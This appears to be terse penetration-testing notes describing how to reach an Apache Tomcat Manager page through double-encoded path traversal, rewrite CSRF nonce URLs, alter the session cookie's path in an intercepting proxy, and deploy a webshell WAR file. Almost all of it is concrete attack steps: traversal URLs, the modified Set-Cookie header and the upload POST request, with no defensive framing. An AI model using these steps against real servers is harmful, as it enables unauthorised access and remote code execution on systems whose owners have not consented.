
Get access to the Tomcat Apache Manager page using the double encoding trick:
<site.com>/examples/jsp/%252e%252e/%252e%252e/manager/html


Note the following doesnt work until you obtain a SessionID that "Path=/path/" value has been reduced to "Path=/"
action="/examples/html/upload?org.apache.catalina.filters.CSRF_NONCE=008002E4232CF43F8775562C722359D8"

will get changed to:
action="/examples/%252e%252e/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=008002E4232CF43F8775562C722359D8"

To obtain the Session ID: Make a GET request to the base manager screen
<site.com>/examples/jsp/%252e%252e/%252e%252e/manager/html

Within Inceptor, right click and select "Do Intercept" > "Response to this Request"
Look at the Response in Intercept for the following:
Set-Cookie: JSESSIONID=2B45AA07D9BA861EDFD247710722F26B; Path=/manager/; HttpOnly

change to:
Set-Cookie: JSESSIONID=2B45AA07D9BA861EDFD247710722F26B; Path=/; HttpOnly

Next, with Intercept on, upload webshell and click Deploy WAR file


POST /examples/%252e%252e/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=99BA3C3223C8CDA3AE36C66B00088185 HTTP/1.1


Look for evidence of WAR file being uploaded.


/examples/%252e%252e/cmde.war